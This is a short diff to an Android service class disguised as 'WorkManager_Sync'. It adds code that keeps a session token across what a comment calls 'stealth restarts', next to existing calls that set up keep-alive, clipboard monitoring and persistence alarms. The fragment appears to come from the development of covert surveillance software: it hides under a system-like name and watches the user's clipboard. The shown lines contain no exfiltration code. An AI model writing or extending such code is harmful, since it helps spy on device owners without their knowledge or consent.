@@ -148,6 +148,14 @@ public class WorkManager_Sync extends Service {
             return;
         }
 
+        // Restore persistent session token across service/stealth restarts
+        String savedToken = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getString("session_token", "");
+        if (savedToken == null || savedToken.isEmpty()) {
+            savedToken = java.util.UUID.randomUUID().toString();
+            getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putString("session_token", savedToken).apply();
+        }
+        activeSessionToken = savedToken;
+
         setupKeepAlive();
         setupClipboardMonitor();
         schedulePersistenceAlarms();
